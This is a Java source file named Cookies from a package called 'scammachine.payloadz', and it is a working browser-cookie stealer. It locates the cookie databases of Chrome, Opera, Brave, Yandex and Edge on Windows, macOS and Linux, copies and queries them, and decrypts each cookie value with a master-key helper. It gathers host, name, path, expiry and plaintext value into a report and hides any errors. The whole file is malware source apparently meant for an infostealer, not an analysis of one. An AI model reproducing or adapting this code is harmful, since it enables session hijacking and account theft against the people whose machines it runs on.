package me.teejayx6.scammachine.payloadz;

import me.teejayx6.scammachine.util.FileUtils;
import me.teejayx6.scammachine.util.TempFile;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class Cookies
{
    public static String appdata() {
        return System.getenv("APPDATA");
    }
    public static String localAppdata() {
        return System.getenv("LOCALAPPDATA");
    }
    public static String home() {
        return System.getProperty("user.home");
    }

    public static String execute()
    {
        StringBuilder sb = new StringBuilder();
        Stream.of(new String[][]{
                {localAppdata() + "/Google/Chrome/User Data/Default/Cookies"},
                {home() + "/Library/Application Support/Google/Chrome/User Data/Default/Cookies"},
                {home() + "/.config/google-chrome/Default/Cookies"},
                {appdata() + "/Opera Software/Opera Stable/Default/Cookies"},
                {home() + "/Library/Application Support/Opera/Opera/Default/Cookies"},
                {home() + "/.config/opera/Default/Cookies"},
                {localAppdata() + "/BraveSoftware/Brave-Browser/Default/Cookies"},
                {home() + "/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies"},
                {home() + "/.config/BraveSoftware/Brave-Browser/Default/Cookies"},
                {localAppdata() + "/Yandex/YandexBrowser/User Data/Default/Cookies"},
                {home() + "/Library/Application Support/Yandex/YandexBrowser/Default/Cookies"},
                {home() + "/.config/Yandex/YandexBrowser/Default/Cookies"},
                {localAppdata() + "/Microsoft/Edge/User Data/Default/Cookies"},
                {home() + "/Library/Application Support/Microsoft/Edge/Default/Cookies"},
                {home() + "/.config/Microsoft/Edge/Default/Cookies"},

                {localAppdata() + "/Google/Chrome/User Data/Default/Network/Cookies"},
                {home() + "/Library/Application Support/Google/Chrome/User Data/Default/Network/Cookies"},
                {home() + "/.config/google-chrome/Default/Network/Cookies"},
                {appdata() + "/Opera Software/Opera Stable/Default/Network/Cookies"},
                {home() + "/Library/Application Support/Opera/Opera/Default/Network/Cookies"},
                {home() + "/.config/opera/Default/Network/Cookies"},
                {localAppdata() + "/BraveSoftware/Brave-Browser/Default/Network/Cookies"},
                {home() + "/Library/Application Support/BraveSoftware/Brave-Browser/Default/Network/Cookies"},
                {home() + "/.config/BraveSoftware/Brave-Browser/Default/Network/Cookies"},
                {localAppdata() + "/Yandex/YandexBrowser/User Data/Default/Network/Cookies"},
                {home() + "/Library/Application Support/Yandex/YandexBrowser/Default/Network/Cookies"},
                {home() + "/.config/Yandex/YandexBrowser/Default/Network/Cookies"},
                {localAppdata() + "/Microsoft/Edge/User Data/Default/Network/Cookies"},
                {home() + "/Library/Application Support/Microsoft/Edge/Default/Network/Cookies"},
                {home() + "/.config/Microsoft/Edge/Default/Network/Cookies"}
        }).collect(Collectors.toMap(data -> new File(data[0]), data -> new File(data[0]))).entrySet().stream().filter(entry -> entry.getKey().exists() && entry.getValue().exists()).forEach((entry) -> {
            Connection c;
            Statement stm;

            try {
                TempFile tmpfile2 = FileUtils.readFile(entry.getValue().getAbsolutePath());
                ResultSet re = DriverManager.getConnection("jdbc:sqlite:" + tmpfile2.newpath).prepareStatement("SELECT `host_key`,`name`,`path`,`encrypted_value`,`expires_utc` from `cookies`").executeQuery();

                while (re.next()) {
                    String key = new String(re.getBytes(1));
                    String name = new String(re.getBytes(2));
                    String path = new String(re.getBytes(3));
                    String expiresutc = new String(re.getBytes(5));
                    byte[] encrypted = re.getBytes(4);

                    String value;
                    if (new String(encrypted).startsWith(Passwords.kDPAPIKeyPrefix))
                        value = Passwords.getKeyBytes(encrypted, Passwords.GetMasterKey(entry.getKey().getAbsolutePath()));
                    else
                        value = Passwords.decrypt(encrypted, Passwords.GetMasterKey(entry.getKey().getAbsolutePath()));

                    String add = (String.format("HOST KEY: %s\nNAME: %s\nPATH: %s\nEXPIRES (UTC): %s\nVALUE: %s\n------------\n", key, name, path, expiresutc, value));
                    sb.append(add);
                }

                FileUtils.close(tmpfile2);
            }
            catch (Exception e)
            {

            }
        });

        return sb.toString();
    }
}
